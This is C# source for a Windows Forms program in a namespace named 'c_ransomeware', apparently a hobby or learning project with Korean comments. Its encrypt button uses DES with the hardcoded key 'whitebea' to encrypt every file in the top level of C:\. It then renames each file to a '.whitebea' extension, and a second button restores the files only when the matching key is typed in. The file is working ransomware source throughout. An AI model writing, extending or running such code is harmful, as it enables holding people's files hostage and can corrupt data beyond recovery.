using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;

namespace c_ransomeware
{
    public partial class Form1 : Form
    {
        string key = "whitebea";
        string path = @"C:\";
        public Form1()
        {
            InitializeComponent();
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            /*
            string path = @"C:\ransome\import.txt";
            string textValue = System.IO.File.ReadAllText(path);
            Console.WriteLine(textValue);*/
            run(key, DES.DesType.Encrypt);


        }

        private void button2_Click(object sender, EventArgs e)
        {
            //복호화
            string deckey = textBox1.Text;
            if(textBox1.Text == "")
            {
                MessageBox.Show("복호화키를 넣어주세요!");
                return;
            }
            if(textBox1.Text != key)
            {
                MessageBox.Show("복호화키가 일치하지않습니다.!");
                return;
            }
            run(deckey, DES.DesType.Decrypt);
        }

        void run(string key, DES.DesType type )
        {
            if (Directory.Exists(path))
            {
                Console.WriteLine(path);


                //존재한다면
                var des = new DES(key);
                DirectoryInfo di = new DirectoryInfo(path);
                foreach (var item in di.GetFiles())
                {
                    Console.WriteLine(item.Name);
                    string path2 = path + @"\" + item.Name;
                    //string textValue = File.ReadAllText(path2);
                    //Console.WriteLine(textValue);
                    StreamReader sr = new StreamReader(path2);
                    string text = sr.ReadToEnd();
                    sr.Close();

                    

                    
                    if(type == DES.DesType.Encrypt)
                    {
                        string newText = des.result(type, text);
                        using (StreamWriter sw = new StreamWriter(path2, false))
                        {
                            sw.Write(newText + "|" + Path.GetExtension(path2));
                            sr.Close();
                        }

                        string ext = Path.ChangeExtension(path2, ".whitebea");
                        File.Move(path2, ext);
                    }
                    else
                    {
                        string[] texts = text.Split('|');
                        // texts[0] == 암호화된 원래내용
                        // texts[1] == 확장자명
                        string newText = des.result(type, texts[0]);
                        using (StreamWriter sw = new StreamWriter(path2, false))
                        {
                            sw.Write(newText);
                            sr.Close();
                        }
                        string ext = Path.ChangeExtension(path2, "."+texts[1]);
                        File.Move(path2, ext);
                    }
                    

                    
                }
            }
            else
            {
                MessageBox.Show("해당 폴더가 없습니다.!");
            }
        }
    }
}
public class DES
{
    public enum DesType
    {
        Encrypt = 0,
        Decrypt = 1
    }

    // Key 값은 무조건 8자리여야한다.
    private byte[] Key { get; set; }

    // 암호화/복호화 메서드
    public string result(DesType type, string input)
    {
        var des = new DESCryptoServiceProvider()
        {
            Key = Key,
            IV = Key
        };

        var ms = new MemoryStream();

        // 익명 타입으로 transform / data 정의
        var property = new
        {
            transform = type.Equals(DesType.Encrypt) ? des.CreateEncryptor() : des.CreateDecryptor(),
            data = type.Equals(DesType.Encrypt) ? Encoding.UTF8.GetBytes(input.ToCharArray()) : Convert.FromBase64String(input)
        };

        var cryStream = new CryptoStream(ms, property.transform, CryptoStreamMode.Write);
        var data = property.data;

        cryStream.Write(data, 0, data.Length);
        cryStream.FlushFinalBlock();

        return type.Equals(DesType.Encrypt) ? Convert.ToBase64String(ms.ToArray()) : Encoding.UTF8.GetString(ms.GetBuffer());
    }

    // 생성자
    public DES(string key)
    {
        Key = ASCIIEncoding.ASCII.GetBytes(key);
    }
}